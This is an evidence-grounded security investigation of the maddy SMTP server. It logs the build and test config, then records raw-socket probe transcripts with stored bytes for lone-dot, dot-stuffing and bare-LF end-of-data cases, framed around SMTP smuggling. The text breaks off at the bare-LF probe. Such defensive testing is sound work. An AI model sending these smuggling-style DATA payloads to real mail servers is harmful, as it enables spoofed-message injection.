# maddy SMTP Security Investigation — DATA Message‑Boundary Handling and Authentication‑Identity Reuse

**Target:** `github.com/foxcpp/maddy`
**Commit (HEAD):** `26452dd8dd787dc455278b0fdd296f4a5432c768`
**Branch:** `maddy_26452dd8dd78`
**Report type:** Evidence‑grounded, runtime‑driven Q&A security investigation
**Method:** maddy was **built, run canonically, and driven with byte‑exact raw‑socket probes**; every behavioural claim below is backed by the **actual, unedited output** the running server produced. Statements that could not be observed at runtime are explicitly labelled **(inferred)**. `file:line` citations pin each conclusion to the source that produces the behaviour.

> **Read‑only repository.** This document is the **only** file added to the repository. All runtime scaffolding — the built binary, the test `maddy.conf`, the SQLite databases, the probe scripts, and the captured logs — lives **outside** the checkout under `/tmp/maddy-test` and `/tmp/maddy-bin`. `git status --porcelain` is empty except for this file (see §5).

---

## The two questions

Both questions are posed against a server that accepts **unauthenticated mail on port 25** and **authenticated submission on port 587**.

**Q1 — Message‑boundary handling in the SMTP DATA phase.** A message body contains normal content, then a line containing **only a dot**, then **more data**, then the real terminator. How does maddy treat that embedded lone‑dot line? We answer three named sub‑parts: **(a)** which outcome occurs — *stops reading at the first lone dot* / *continues consuming input past it* / *is left in an unexpected connection state*; **(b)** the **runtime signs** — SMTP wire replies, `-debug` log lines, connection open/close behaviour; **(c)** what actually ends up **stored/queued** (exact bytes). Because this is the **“SMTP smuggling”** problem space, we also exercise dot‑stuffing and the bare‑`<LF>` end‑of‑data variants `<LF>.<LF>` and `<LF>.<CR><LF>`, on **both** listeners.

**Q2 — Authentication‑identity reuse across transactions.** A client authenticates as **user A** on :587, begins a message (`MAIL FROM:<A>`), issues `RSET`, then sends `MAIL FROM` claiming **user B without re‑authenticating**. How does maddy respond? We answer **(a)** the outcome — *rejected* / *tied back to identity A* / *allowed to proceed in a way that could blur accountability*; and **(b)** which identity is trusted across **three named delivery sinks** — **headers** (the `Received` trace), **queue metadata** (the persisted `.meta`), and **enforcement checks** (the identity the pipeline checks and the **command hook** see). We repeat with a **local‑domain B** and a **non‑local‑domain B**.

---

# 1. Setup — canonical runtime

Everything in this section was recorded from the running container. All artifacts live outside the repository.

## 1.1 Toolchain

```
$ go version
go version go1.13.15 linux/amd64

$ gcc --version | head -1
gcc (Ubuntu 15.2.0-4ubuntu4) 15.2.0

$ go env CGO_ENABLED GOROOT GOPATH GO111MODULE
1
/usr/local/go
/root/go
on
```

- **Go 1.13.15** is the highest patch of the `go 1.13` version declared at `go.mod:L3`.
- **CGO is enabled** because the SQLite driver `github.com/mattn/go-sqlite3 v1.11.0` (`go.mod:L26`) is a CGO package; `gcc` satisfies it.
- The module cache resolves to **`/root/go/pkg/mod`** (`$GOPATH/pkg/mod`). Under Go 1.13 the `GOMODCACHE` environment variable is not yet defined, but the cache directory is present and was used for the external line‑number confirmation in §1.10.

## 1.2 Canonical build

The binary is built from the checkout but written **outside** it (`/tmp/maddy-bin`), so the working tree stays clean. The build target is `cmd/maddy/main.go`, whose `main()` is `os.Exit(maddy.Run())` (`cmd/maddy/main.go:L10`).

```
$ CGO_ENABLED=1 go build -o /tmp/maddy-bin ./cmd/maddy
# github.com/mattn/go-sqlite3
sqlite3-binding.c: In function ‘sqlite3SelectNew’:
sqlite3-binding.c:125322:10: warning: function may return address of local variable [-Wreturn-local-addr]
125322 |   return pNew;
       |          ^~~~
sqlite3-binding.c:125282:10: note: declared here
125282 |   Select standin;
       |          ^~~~~~~
$ echo exit=$?
exit=0
```

The single warning originates in the bundled SQLite C amalgamation shipped inside `mattn/go-sqlite3`; it is benign and the build exits `0`. The provisioning tool was built the same way:

```
$ CGO_ENABLED=1 go build -o /tmp/maddyctl-bin ./cmd/maddyctl
# (same benign SQLite CGO warning) — exit 0
```

Binary identity:

```
$ /tmp/maddy-bin -v
maddy unknown (built from source tree)
```

## 1.3 Repository is unchanged by the build

```
$ git status --porcelain
$        # (empty — clean)
```

The build writes only to `/tmp`; `HEAD` remains `26452dd8dd787dc455278b0fdd296f4a5432c768`.

## 1.4 Test configuration (verbatim)

The temporary config is derived from the repository template `maddy.conf` (read as a template; the repo copy is **not** modified) and placed at `/tmp/maddy-test/maddy.conf`. It binds the unauthenticated `smtp` listener on **:25** and the authenticated `submission` listener on **:587**, provisions the `sql` module for both storage and authdb, and wires a `queue` target so the `.header`/`.body`/`.meta` evidence files exist. The header comment documents every deviation from the repo default and why.

```
# =====================================================================
# TEMPORARY, OUTSIDE-REPO test configuration for the maddy SMTP
# security investigation (Q1 DATA-boundary handling, Q2 auth-identity
# reuse). Derived from the repo template maddy.conf (read-only) but the
# repo copy is NOT modified. All state/DB/queue/log artifacts live under
# /tmp/maddy-test so the checkout stays byte-for-byte unchanged.
#
# Differences from repo maddy.conf and WHY (documented per the rules):
#   1. hostname/primary_domain/local_domains = example.org  (repo default,
#      maddy.conf:L4,L9,L12).
#   2. `tls off` (repo maddy.conf:L16-17 points at on-disk certs we do not
#      have). With TLS off maddy force-enables insecure AUTH with a warning
#      (smtp.go:L537-545), which is acceptable for a loopback test and does
#      NOT change the submission code path.
#   3. submission bound to tcp://0.0.0.0:587 (plaintext) instead of the repo
#      default tls://0.0.0.0:465 (maddy.conf:L93), to reproduce the user's
#      literal ":587 authenticated submission" scenario through the IDENTICAL
#      submission code path (config detail, not a behavior change).
#   4. The port-25 DNS-dependent checks (require_matching_ehlo,
#      require_mx_record, verify_dkim, apply_spf, dmarc  -> repo maddy.conf
#      L56-70) are REMOVED because this box has no DNS and probing is pure
#      loopback. This does NOT affect either code path under test: DATA
#      framing lives in go-smtp/textproto (not gated by checks) and the
#      authenticated identity is bound in newSession (smtp.go:L674, not gated
#      by checks). The structural sender guards (501 5.1.8 / 550 5.1.1) are
#      preserved.
#   5. A `command` check that echoes {auth_user}/{sender}/{source_ip} is added
#      to the submission pipeline purely to OBSERVE the enforcement-check sink
#      for Q2 (command.go:L145-149). It exits 0 (never rejects).
# =====================================================================

$(hostname) = example.org
$(primary_domain) = example.org
$(local_domains) = $(primary_domain)

tls off

state /tmp/maddy-test/state
runtime /tmp/maddy-test/runtime

hostname $(hostname)
autogenerated_msg_domain $(primary_domain)

# SQLite-backed storage + authdb (CGO). Mirrors repo maddy.conf:L32-35.
sql local_mailboxes local_authdb {
    driver sqlite3
    dsn /tmp/maddy-test/state/all.db
}

(local_delivery_actions) {
    modify {
        replace_rcpt postmaster postmaster@$(primary_domain)
    }
}

# ---------------------------------------------------------------------
# Unauthenticated inbound SMTP on :25  (repo maddy.conf:L53-91).
# DNS-dependent checks intentionally omitted (see header note 4).
# ---------------------------------------------------------------------
smtp tcp://0.0.0.0:25 {
    # Do not let strangers pretend to be us (repo maddy.conf:L74-76).
    source $(local_domains) {
        reject 501 5.1.8 "Use Submission for outgoing SMTP"
    }
    default_source {
        destination postmaster $(local_domains) {
            import local_delivery_actions
            deliver_to &local_mailboxes
        }
        # Not an open relay (repo maddy.conf:L87-89).
        default_destination {
            reject 550 5.1.1 "User not local"
        }
    }
}

# ---------------------------------------------------------------------
# Authenticated submission on :587  (repo maddy.conf:L93-120, port changed
# from 465/TLS to 587/plaintext; see header note 3).
# ---------------------------------------------------------------------
submission tcp://0.0.0.0:587 {
    auth &local_authdb

    # Enforcement-check observation hook (Q2 sink #3). Runs at the sender
    # stage so it sees the current MAIL FROM plus the connection AuthUser.
    check {
        command /tmp/maddy-test/logauth.sh {auth_user} {sender} {source_ip} {
            run_on sender
        }
    }

    source $(local_domains) {
        destination $(local_domains) {
            import local_delivery_actions
            deliver_to &local_mailboxes
        }
        # Non-local recipients are enqueued for remote delivery
        # (repo maddy.conf:L109-112) -> produces .header/.body/.meta.
        default_destination {
            deliver_to &remote_queue
        }
    }

    # Anti-spoof: local senders may not use non-local sender addresses
    # (repo maddy.conf:L117-119). Q2's non-local-B case must trip this.
    default_source {
        reject 501 5.1.8 "Non-local sender domain"
    }
}

# ---------------------------------------------------------------------
# Queue target (repo maddy.conf:L122-147). Explicit location so the
# .header/.body/.meta evidence files are easy to find. authenticate_mx off
# keeps the remote target offline-safe.
# ---------------------------------------------------------------------
queue remote_queue {
    location /tmp/maddy-test/queue
    max_tries 8
    max_parallelism 16
    target remote {
        authenticate_mx off
    }
    bounce {
        destination $(local_domains) {
            deliver_to &local_mailboxes
        }
        default_destination {
            reject 550 5.0.0 "Refusing to send DSNs to non-local addresses"
        }
    }
}
```

## 1.5 Enforcement‑check observation helper

The `command` check in the submission pipeline invokes this script at the sender stage. maddy expands the placeholders **before** exec, so the arguments the script receives are exactly the values the command hook computes: `{auth_user}` from `expandCommand()` (`internal/check/command/command.go:L145`, returning `s.msgMeta.Conn.AuthUser` at `L149`), `{sender}` (the current `MAIL FROM`; `case "{sender}":` at `command.go:L178`, returning `s.mailFrom` at `L179`), and `{source_ip}` (`command.go:L150`).

```
#!/bin/sh
# Enforcement-check observation helper (Q2 sink #3).
# Invoked by maddy's `command` check on the submission pipeline.
# maddy expands the placeholders BEFORE exec, so the arguments this script
# receives are exactly what the command hook sees:
#   $1 = {auth_user}  (module.MsgMetadata.Conn.AuthUser  -> command.go:L149)
#   $2 = {sender}     (the current MAIL FROM value       -> command.go:L179)
#   $3 = {source_ip}  (command.go:L150)
# We append them to a capture file and exit 0 (check passes, delivery proceeds).
printf 'COMMAND-CHECK stage=sender auth_user=[%s] sender=[%s] source_ip=[%s]\n' "$1" "$2" "$3" >> /tmp/maddy-test/captures/enforcement_check.log
# Also emit to stderr so it is interleaved into the maddy -debug log stream.
printf 'COMMAND-CHECK stage=sender auth_user=[%s] sender=[%s] source_ip=[%s]\n' "$1" "$2" "$3" 1>&2
exit 0
```

This hook only **observes**; it exits `0` and never rejects, so it does not alter the delivery decision.

## 1.6 User provisioning

Two local users A = `alice@example.org` and B = `bob@example.org` were created in the `sql` authdb through the built admin binary. The exact commands and their result:

```
$ /tmp/maddyctl-bin --config /tmp/maddy-test/maddy.conf users create --cfg-block local_authdb -p 'PassA-123' alice@example.org
$ echo exit=$?
exit=0
$ /tmp/maddyctl-bin --config /tmp/maddy-test/maddy.conf users create --cfg-block local_authdb -p 'PassB-456' bob@example.org
$ echo exit=$?
exit=0

$ /tmp/maddyctl-bin --config /tmp/maddy-test/maddy.conf users list --cfg-block local_authdb
alice@example.org
bob@example.org
```

(The passwords above are throwaway test credentials for a loopback SQLite database that is deleted on completion; they are not real secrets.)

## 1.7 Server invocation and startup log

The runtime flags were confirmed from the binary itself: `/tmp/maddy-bin` accepts `-config`, `-debug`, `-libexec`, `-log`, `-v` — there is **no `run` subcommand**. The server is launched with `-debug` and its combined stdout/stderr captured to a logfile outside the repo:

```
$ nohup /tmp/maddy-bin -config /tmp/maddy-test/maddy.conf -debug \
    > /tmp/maddy-test/captures/maddy-debug.log 2>&1 &
```

The startup log confirms both listeners are bound and that TLS‑off insecure operation is force‑enabled with a warning:

```
$ grep -nE "listening on|TLS is disabled" /tmp/maddy-test/captures/maddy-debug.log
4:smtp: listening on tcp://0.0.0.0:25
5:smtp: TLS is disabled, this is insecure configuration and should be used only for testing!
15:submission: listening on tcp://0.0.0.0:587
16:submission: TLS is disabled, this is insecure configuration and should be used only for testing!
```

**Observed nuance (grounded):** the source at `internal/endpoint/smtp/smtp.go` prints two distinct warnings — `"authentication over unencrypted connections is allowed…"` (`L537‑538`) and `"TLS is disabled…"` (`L540‑542`) — and then sets `endp.serv.AllowInsecureAuth = true` (`L545`). Only the **“TLS is disabled”** line appears at startup: the `L537` guard tests `AllowInsecureAuth`, which is still `false` at that point (it is only set to `true` at `L545`), so the first warning is not emitted for this configuration. The net effect is the same — plaintext `AUTH PLAIN` works on :587 without TLS, which the EHLO capability list confirms below. The banner on both ports is `220 example.org ESMTP Service Ready`.

## 1.8 Raw‑socket probe client

Both questions depend on transmitting exact byte sequences (an embedded lone dot mid‑stream, bare‑`<LF>` terminators, a precise `AUTH`/`MAIL FROM`/`RSET`/`MAIL FROM` order) that ordinary mail libraries normalise or forbid. All probes therefore use a **byte‑exact Python `socket` client** that writes the literal payload bytes and reads raw wire replies. In the transcripts below, lines prefixed `>>>` are what the client sent, lines prefixed `<<<` are the server’s raw replies, and `SENT-BYTES DATA-PAYLOAD:` shows the exact bytes of the DATA phase as a Python `bytes` repr (so `\r\n`, `\n`, and `.` are unambiguous). The probe also issues a `NOOP` after DATA as a liveness check and prints `CONN-STATE-AFTER-DATA: OPEN|CLOSED`.

## 1.9 Evidence sinks

- **Stored (delivered) message** — a flat file at `/tmp/maddy-test/state/messages/<key>` containing the full RFC 822 message (`Delivered-To`, `Return-Path`, `Received`, the original headers, a blank line, then the body). Message bodies are stored externally on disk, not inline in the SQLite `msgs` table.
- **Queue metadata / header / body** — flat files at `/tmp/maddy-test/queue/<msg_id>.{meta,header,body}`. These are short‑lived (offline, the `remote` target fails fast and the queue removes the job and bounces), so a background poller was used to copy them the instant they appeared; it also captured the transient `.meta.new` temp file that `updateMetadataOnDisk()` writes before the atomic rename.
- **`-debug` log stream** — `/tmp/maddy-test/captures/maddy-debug.log`.
- **Enforcement‑check capture** — `/tmp/maddy-test/captures/enforcement_check.log` (from §1.5).

Two observed serialization facts that matter for reading the captures: the `textproto` `dotReader` **normalises body line endings `\r\n` → `\n`**, while headers are re‑serialized with `\r\n`; and on the unauthenticated :25 path the `smtp: incoming message` log line has **no `username` field** (the authenticated identity is empty there).

## 1.10 External line numbers confirmed at runtime

The go‑smtp module‑cache files and the Go standard‑library `net/textproto` file live **outside** the checkout. Their line numbers were confirmed by opening the resolved files in this container and are cited with those confirmed values throughout §2.

- **Resolved module cache:** `/root/go/pkg/mod`
- **go‑smtp version:** `v0.12.1-0.20191206174923-1f576e0ec85c` (`go.mod:L19`), resolved directory `/root/go/pkg/mod/github.com/emersion/go-smtp@v0.12.1-0.20191206174923-1f576e0ec85c`
- **Resolved GOROOT:** `/usr/local/go` → stdlib file `/usr/local/go/src/net/textproto/reader.go`

Confirmed lines:

| File | Symbol / behaviour | Confirmed line |
|------|--------------------|----------------|
| go‑smtp `conn.go` | `unrecognizedCommand` → `WriteResponse(500, {5,5,2}, "Syntax error, %v command unrecognized")` | L77–L78 |
| go‑smtp `conn.go` | `nbrErrors++`; `if c.nbrErrors > 3` → `"Too many unrecognized commands"` + `c.Close()` | L80–L83 |
| go‑smtp `conn.go` | empty command → `500 5.5.2 "Speak up"` | L102 |
| go‑smtp `conn.go` | `handleData`; `354` intermediate reply | L498; L510 |
| go‑smtp `conn.go` | `r := newDataReader(c)` | L519 |
| go‑smtp `conn.go` | `code, … := toSMTPStatus(c.Session().Data(r))` | L520 |
| go‑smtp `conn.go` | post‑DATA drain `io.Copy(ioutil.Discard, r)` | L521 |
| go‑smtp `server.go` | parse error → `WriteResponse(501, {5,5,2}, "Bad command")` | L145 |
| go‑smtp `data.go` | `newDataReader(c *Conn) io.Reader` | L51 |
| go‑smtp `data.go` | `dr.r = c.text.DotReader()` | L53 |
| stdlib `net/textproto/reader.go` | `DotReader()` constructs `&dotReader{r: r}` | L299–L301 |
| stdlib `net/textproto/reader.go` | `type dotReader`; `func (d *dotReader) Read` | L305; L311–L396 |
| stdlib `net/textproto/reader.go` | de‑stuff: `stateBeginLine` sees `.` → `stateDot` (dot swallowed) | L334–L336 |
| stdlib `net/textproto/reader.go` | **bare‑LF EOF:** `stateDot` sees `\n` → `stateEOF` | L349–L351 |
| stdlib `net/textproto/reader.go` | **CRLF EOF:** `stateDotCR` sees `\n` → `stateEOF` | L358 |
| stdlib `net/textproto/reader.go` | return `io.EOF` when `state == stateEOF` | L389–L391 |


---

# 2. Q1 — Message‑boundary handling in the SMTP DATA phase

## 2.1 Answer (observed)

- **(a) Outcome: maddy STOPS READING at the first lone‑dot line.** It does **not** continue consuming input past the first `<CRLF>.<CRLF>`, and the connection is **not** left in an unexpected state — it stays **open** and ready for the next command. The bytes after the first lone dot re‑enter go‑smtp’s command loop and are parsed as new SMTP commands.
- **(b) Runtime signs:** the DATA carrier is answered `250 2.0.0 OK: queued`; the trailing bytes then draw `500 5.5.2 Syntax error, … command unrecognized` and `501 5.5.2 Bad command` replies on the same connection; a subsequent `NOOP` still returns `250` (proving the connection is open); and the `-debug` log shows exactly one `incoming message` / `accepted` cycle for the carrier.
- **(c) What is stored/queued:** the delivered message contains the body **up to but not including** the first lone dot. The “more data” after it (`Line B`) is **never** part of the stored message.

maddy additionally accepts the **non‑standard bare‑`<LF>` end‑of‑data variants** `<LF>.<LF>` and `<LF>.<CR><LF>` as end‑of‑data, and de‑stuffs a doubled leading dot per RFC 5321 §4.5.2. The bare‑`<LF>` leniency is the property that makes the classic SMTP‑smuggling injection reproducible (§2.9).

## 2.2 Standards and security framing (factual)

- **RFC 5321 §4.5.2 (transparency / dot‑stuffing).** The canonical end‑of‑mail indicator is a line containing only `.`; the canonical terminator sequence is `<CRLF>.<CRLF>`. On receipt, a leading `.` on a non‑empty line is deleted (dot‑stuffing is reversed). This is the standard against which maddy’s DATA framing is judged.
- **2023 “SMTP smuggling.”** The SEC Consult disclosure and CERT/CC note **VU#302671** describe how permissive parsing of non‑standard end‑of‑data sequences — notably bare‑`<LF>` forms such as `<LF>.<CR><LF>` — creates a parsing differential between an outbound and an inbound MTA, letting an attacker smuggle a second message with a spoofed envelope. Tracked as **CVE‑2023‑51764** (Postfix), **CVE‑2023‑51765** (Sendmail), **CVE‑2023‑51766** (Exim); remediations enforce strict CRLF handling. This is why the bare‑`<LF>` variants (D4, D5) and the end‑to‑end injection (D6) are exercised, not only the standard bare dot.

## 2.3 The code path (grounded)

maddy does **not** implement its own DATA‑terminator scan. The delegation chain, confirmed by reading each file, is:

1. `Session.Data(r io.Reader)` — the maddy DATA entry point (`internal/endpoint/smtp/smtp.go:L312`) — hands the reader to `prepareBody()` (`smtp.go:L283`).
2. `prepareBody()` reads the header with `textproto.ReadHeader` (`smtp.go:L285`), runs `submissionPrepare` on submission traffic (`smtp.go:L292`), then buffers the body with `buffer.BufferInMemory(bufr)` (`smtp.go:L298`). It **buffers whatever the reader yields** — it never looks for `<CRLF>.<CRLF>` itself.
3. The reader is go‑smtp’s `newDataReader(c)` (`data.go:L51`), which is `c.text.DotReader()` (`data.go:L53`).
4. `DotReader()` returns the standard‑library `net/textproto` **`dotReader`** state machine (`reader.go:L305`, `Read` at `L311‑L396`). **This is the actual end‑of‑data detector.** It treats the first lone‑dot line as `io.EOF` (`stateDotCR`+`\n`→`stateEOF` at `L358` for `<CR><LF>`; `stateDot`+`\n`→`stateEOF` at `L349‑L351` for bare `<LF>`), de‑stuffs a leading dot (`stateBeginLine` sees `.`→`stateDot`, dot swallowed, `L334‑L336`), and normalises body `\r\n`→`\n`.

After `Session.Data(r)` returns at EOF, go‑smtp drains the **same** reader with `io.Copy(ioutil.Discard, r)` (`conn.go:L521`). Because the reader is already at EOF at the first lone dot, this copy reads **zero** bytes — the trailing bytes are **not** consumed here. They remain in the connection’s buffered reader, so go‑smtp’s command loop parses them as new commands: an unrecognised verb draws `500 5.5.2` (`conn.go:L77‑L78`), a malformed line draws `501 5.5.2 "Bad command"` (`server.go:L145`), and only after more than three such errors would go‑smtp close the connection (`conn.go:L80‑L83`) — a cutoff not reached in these probes. *(The “trailing bytes are not drained because the reader is already at EOF” link between L520 and L521 is **inferred** from the source; it is corroborated at runtime by the observed `500`/`501` replies to the trailing bytes in D2.)*

## 2.4 D1 — standard terminator `<CRLF>.<CRLF>` (control)

Establishes the baseline. Run on both listeners; behaviour identical across two runs each.

### D1 on :25 (unauthenticated)

```
===== CONNECT 127.0.0.1:25 =====
<<< 220 example.org ESMTP Service Ready
>>> EHLO probe.client.example
<<< 250-Hello probe.client.example
<<< 250-PIPELINING
<<< 250-8BITMIME
<<< 250-ENHANCEDSTATUSCODES
<<< 250-SMTPUTF8
<<< 250 SIZE 33554432
>>> MAIL FROM:<outsider@external.example>
<<< 250 2.0.0 Roger, accepting mail from <outsider@external.example>
>>> RCPT TO:<alice@example.org>
<<< 250 2.0.0 I'll make sure <alice@example.org> gets this
>>> DATA
<<< 354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>
SENT-BYTES DATA-PAYLOAD: b'Subject: D1 control\r\nFrom: Probe <outsider@external.example>\r\nTo: <alice@example.org>\r\n\r\nline1\r\nline2\r\n.\r\n'
<<< 250 2.0.0 OK: queued
>>> NOOP (liveness probe)
<<< 250 2.0.0 I have sucessfully done nothing
CONN-STATE-AFTER-DATA: OPEN
>>> QUIT
<<< 221 2.0.0 Goodnight and good luck
```

`-debug` log delta for this delivery:

```
smtp: incoming message	{"msg_id":"018e8960","sender":"outsider@external.example","src_host":"probe.client.example","src_ip":"127.0.0.1:42078"}
smtp/pipeline: sender outsider@external.example matched by default rule	{"msg_id":"018e8960"}
smtp/pipeline: recipient alice@example.org matched by domain rule 'example.org'	{"msg_id":"018e8960"}
smtp/pipeline: tgt.Start(outsider@external.example) ok, target = sql:local_mailboxes	{"msg_id":"018e8960"}
smtp: RCPT ok	{"msg_id":"018e8960","rcpt":"alice@example.org"}
smtp: accepted	{"msg_id":"018e8960"}
```

Exact stored bytes (`/tmp/maddy-test/state/messages/764ec35567e73e7e5286bbfa1327ffc6`, Python `bytes` repr):

```
b'Delivered-To: alice@example.org\r\nReturn-Path: <outsider@external.example>\r\nReceived: from probe.client.example (localhost [127.0.0.1]) by example.org\r\n (envelope-sender <outsider@external.example>) with ESMTP id 018e8960; Mon,\r\n 13 Jul 2026 16:47:44 +0000\r\nSubject: D1 control\r\nFrom: Probe <outsider@external.example>\r\nTo: <alice@example.org>\r\n\r\nline1\nline2\n'
```

The body is exactly `line1\nline2\n` — both lines delivered, `\r\n` normalised to `\n`. On :25 the `Received` header includes the `from probe.client.example (localhost [127.0.0.1])` trace clause.

### D1 on :587 (authenticated submission)

```
>>> AUTH PLAIN <base64 for alice@example.org>
<<< 235 2.0.0 Authentication succeeded
>>> MAIL FROM:<alice@example.org>
<<< 250 2.0.0 Roger, accepting mail from <alice@example.org>
>>> RCPT TO:<alice@example.org>
<<< 250 2.0.0 I'll make sure <alice@example.org> gets this
>>> DATA
<<< 354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>
SENT-BYTES DATA-PAYLOAD: b'Subject: D1 control\r\nFrom: Probe <alice@example.org>\r\nTo: <alice@example.org>\r\n\r\nline1\r\nline2\r\n.\r\n'
<<< 250 2.0.0 OK: queued
>>> NOOP (liveness probe)
<<< 250 2.0.0 I have sucessfully done nothing
CONN-STATE-AFTER-DATA: OPEN
```

Exact stored bytes (`…/messages/87241435b0e6b91e0502804ecc0835b7`):

```
b'Delivered-To: alice@example.org\r\nReturn-Path: <alice@example.org>\r\nReceived:  by example.org (envelope-sender <alice@example.org>) with ESMTP\r\n id 48e93c44; Mon, 13 Jul 2026 16:47:51 +0000\r\nDate: Mon, 13 Jul 2026 16:47:51 +0000\r\nMessage-Id: <c2c184cc-4868-44ca-baa7-b68c57e18af3@example.org>\r\nSubject: D1 control\r\nFrom: Probe <alice@example.org>\r\nTo: <alice@example.org>\r\n\r\nline1\nline2\n'
```

Two submission‑specific differences appear (both grounded): the `Received` header has a **double space** where the client‑trace clause would be — submission sets `DontTraceSender = true` (`submission.go:L28`), which suppresses the `from <host> [ip]` clause (`received.go:L30‑L58`) while the `(envelope-sender <…>)` clause is still emitted unconditionally (`received.go:L69‑L71`); and `submissionPrepare()` (`submission.go:L27`) has synthesized the `Date` and `Message-Id` headers. The corresponding `incoming message` log line on :587 additionally carries `"username":"alice@example.org"` (see D2 below).


## 2.5 D2 — embedded lone dot (PRIMARY)

This is the user’s exact scenario: normal content, a lone‑dot line `<CRLF>.<CRLF>`, **more data** (`Line B`), then the real terminator `<CRLF>.<CRLF>`. The single DATA payload sent is:

```
b'…\r\n\r\nLine A\r\n.\r\nLine B\r\n.\r\n'
```

### D2 on :25 (unauthenticated)

```
>>> DATA
<<< 354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>
SENT-BYTES DATA-PAYLOAD: b'Subject: D2 embedded lone dot\r\nFrom: Probe <outsider@external.example>\r\nTo: <alice@example.org>\r\n\r\nLine A\r\n.\r\nLine B\r\n.\r\n'
<<< 250 2.0.0 OK: queued
<<< 500 5.5.2 Syntax error, LINE command unrecognized
<<< 501 5.5.2 Bad command
>>> NOOP (liveness probe)
<<< 250 2.0.0 I have sucessfully done nothing
CONN-STATE-AFTER-DATA: OPEN
>>> QUIT
<<< 221 2.0.0 Goodnight and good luck
```

The three replies, in order, are the observed proof of **(a)** and **(b)**:

1. `250 2.0.0 OK: queued` — the server treated the **first** `\r\n.\r\n` as end‑of‑data and accepted the carrier message.
2. `500 5.5.2 Syntax error, LINE command unrecognized` — the trailing `Line B\r\n` re‑entered the command loop and was parsed as an SMTP command; go‑smtp uppercases the first token to `LINE`, which is unknown → `500 5.5.2` (`conn.go:L77‑L78`).
3. `501 5.5.2 Bad command` — the trailing `.\r\n` is too short to be a valid command, so `parseCmd` errors and go‑smtp replies `501 5.5.2 "Bad command"` (`server.go:L145`).

The subsequent `NOOP → 250` and `CONN-STATE-AFTER-DATA: OPEN` confirm the connection was **not** left in an unexpected state.

**(c) Exact stored bytes** (`…/messages/8def1ee3e95affda9fedefd7d3549c16`):

```
b'Delivered-To: alice@example.org\r\nReturn-Path: <outsider@external.example>\r\nReceived: from probe.client.example (localhost [127.0.0.1]) by example.org\r\n (envelope-sender <outsider@external.example>) with ESMTP id 8be77b76; Mon,\r\n 13 Jul 2026 16:47:56 +0000\r\nSubject: D2 embedded lone dot\r\nFrom: Probe <outsider@external.example>\r\nTo: <alice@example.org>\r\n\r\nLine A\n'
```

The stored body is **`Line A\n` only**. `Line B` is **not** present anywhere in the delivered message — it was consumed as a (failed) command, not as body. The `-debug` log shows exactly one delivery cycle for the carrier:

```
smtp: incoming message	{"msg_id":"8be77b76","sender":"outsider@external.example","src_host":"probe.client.example","src_ip":"127.0.0.1:51480"}
smtp: RCPT ok	{"msg_id":"8be77b76","rcpt":"alice@example.org"}
smtp: accepted	{"msg_id":"8be77b76"}
```

### D2 on :587 (authenticated submission)

Same DATA payload, authenticated as A first. The wire replies are identical:

```
>>> AUTH PLAIN <base64 for alice@example.org>
<<< 235 2.0.0 Authentication succeeded
>>> MAIL FROM:<alice@example.org>
<<< 250 2.0.0 Roger, accepting mail from <alice@example.org>
>>> RCPT TO:<alice@example.org>
<<< 250 2.0.0 I'll make sure <alice@example.org> gets this
>>> DATA
<<< 354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>
SENT-BYTES DATA-PAYLOAD: b'Subject: D2 embedded lone dot\r\nFrom: Probe <alice@example.org>\r\nTo: <alice@example.org>\r\n\r\nLine A\r\n.\r\nLine B\r\n.\r\n'
<<< 250 2.0.0 OK: queued
<<< 500 5.5.2 Syntax error, LINE command unrecognized
<<< 501 5.5.2 Bad command
>>> NOOP (liveness probe)
<<< 250 2.0.0 I have sucessfully done nothing
CONN-STATE-AFTER-DATA: OPEN
```

Exact stored bytes (`…/messages/d3a5476661f387340f9f97d9258c4321`):

```
b'Delivered-To: alice@example.org\r\nReturn-Path: <alice@example.org>\r\nReceived:  by example.org (envelope-sender <alice@example.org>) with ESMTP\r\n id 1cc5ee07; Mon, 13 Jul 2026 16:48:02 +0000\r\nDate: Mon, 13 Jul 2026 16:48:02 +0000\r\nMessage-Id: <9677c8f0-b782-49c5-8e8e-9f8521e56991@example.org>\r\nSubject: D2 embedded lone dot\r\nFrom: Probe <alice@example.org>\r\nTo: <alice@example.org>\r\n\r\nLine A\n'
```

Again the body is `Line A\n` only. The delivery‑start log line on :587 carries the authenticated identity, whereas on :25 it does not:

```
submission: incoming message	{"msg_id":"1cc5ee07","sender":"alice@example.org","src_host":"probe.client.example","src_ip":"127.0.0.1:43676","username":"alice@example.org"}
```

**Conclusion for D2 (both listeners, identical):** maddy stops at the first lone dot; the trailing data becomes command‑loop input (drawing `500`/`501`); the connection stays open; and only the content before the first lone dot is stored.

## 2.6 D3 — dot‑stuffing (`..stuffed`)

A body line beginning with a doubled dot verifies RFC 5321 §4.5.2 de‑stuffing. Payload body: `..stuffed\r\nnormal line\r\n.\r\n`.

```
>>> DATA
<<< 354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>
SENT-BYTES DATA-PAYLOAD: b'Subject: D3 dot-stuffing\r\nFrom: Probe <outsider@external.example>\r\nTo: <alice@example.org>\r\n\r\n..stuffed\r\nnormal line\r\n.\r\n'
<<< 250 2.0.0 OK: queued
>>> NOOP (liveness probe)
<<< 250 2.0.0 I have sucessfully done nothing
CONN-STATE-AFTER-DATA: OPEN
```

Exact stored bytes (`…/messages/c4d73ab1b9b9a8692c6b2a598764285b`):

```
b'Delivered-To: alice@example.org\r\nReturn-Path: <outsider@external.example>\r\nReceived: from probe.client.example (localhost [127.0.0.1]) by example.org\r\n (envelope-sender <outsider@external.example>) with ESMTP id 9917d2e5; Mon,\r\n 13 Jul 2026 16:48:08 +0000\r\nSubject: D3 dot-stuffing\r\nFrom: Probe <outsider@external.example>\r\nTo: <alice@example.org>\r\n\r\n.stuffed\nnormal line\n'
```

The stored body is `.stuffed\nnormal line\n` — the transmitted `..stuffed` was de‑stuffed to a **single** leading dot, exactly as RFC 5321 §4.5.2 requires, and the following `.\r\n` was correctly recognised as the terminator (not as a stuffed line). Identical on :587 across two runs.

## 2.7 D4 — bare `<LF>.<LF>` end‑of‑data

No CRs anywhere around the dot: body `body four\n.\n`. Strict RFC 5321 requires `<CRLF>.<CRLF>`; this probes leniency.

```
>>> DATA
<<< 354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>
